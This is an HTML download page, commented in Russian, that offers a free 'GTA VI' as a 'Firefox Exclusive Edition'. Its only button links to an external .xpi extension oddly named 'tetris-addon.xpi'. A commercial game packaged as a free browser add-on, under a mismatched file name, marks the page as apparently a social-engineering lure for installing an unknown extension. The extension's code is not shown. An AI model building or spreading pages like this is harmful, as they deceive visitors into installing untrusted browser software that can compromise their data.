<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download GTA VI for Firefox</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background: radial-gradient(circle at center, #2e1065 0%, #090514 100%);
      color: #ffffff;
      font-family: 'Impact', 'Arial Black', system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    /* Декоративный неоновый фон */
    body::before {
      content: '';
      position: absolute;
      width: 300px;
      height: 300px;
      background: #f43f5e;
      filter: blur(150px);
      opacity: 0.4;
      z-index: 0;
    }

    .card {
      position: relative;
      z-index: 1;
      background: rgba(15, 23, 42, 0.75);
      backdrop-filter: blur(12px);
      padding: 45px 35px;
      border-radius: 20px;
      text-align: center;
      max-width: 420px;
      width: 90%;
      border: 2px solid rgba(244, 63, 94, 0.3);
      box-shadow: 0 0 30px rgba(236, 72, 153, 0.2),
                  0 20px 40px rgba(0, 0, 0, 0.8);
    }

    /* Логотип в стиле GTA VI */
    .gta-logo {
      font-size: 52px;
      font-weight: 900;
      font-style: italic;
      text-transform: uppercase;
      letter-spacing: 2px;
      background: linear-gradient(180deg, #fbcfe8 0%, #f43f5e 45%, #881337 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(244, 63, 94, 0.5);
      margin-bottom: 5px;
      line-height: 1;
    }

    .gta-vi {
      font-size: 64px;
      background: linear-gradient(135deg, #a855f7 0%, #ec4899 50%, #e11d48 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: inline-block;
      margin-left: 8px;
    }

    .subtitle {
      font-family: system-ui, -apple-system, sans-serif;
      color: #cbd5e1;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 30px;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }

    /* Кнопка скачивания */
    .btn {
      display: block;
      width: 100%;
      padding: 16px 20px;
      font-size: 22px;
      font-style: italic;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: #ffffff;
      background: linear-gradient(90deg, #ec4899 0%, #8b5cf6 100%);
      border: none;
      border-radius: 10px;
      cursor: pointer;
      text-decoration: none;
      box-shadow: 0 4px 15px rgba(236, 72, 153, 0.4);
      transition: all 0.2s ease-in-out;
    }

    .btn:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 6px 25px rgba(236, 72, 153, 0.7);
      background: linear-gradient(90deg, #f43f5e 0%, #a855f7 100%);
    }

    .btn:active {
      transform: translateY(1px) scale(0.98);
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="gta-logo">GTA<span class="gta-vi">VI</span></div>
    <div class="subtitle">Firefox Exclusive Edition</div>

    <!-- Прямая ссылка на твой .xpi файл -->
    <a href="https://ssdunix.xyz/GTA6-free/tetris-addon.xpi" class="btn">
      Download Free
    </a>
  </div>

</body>
</html>
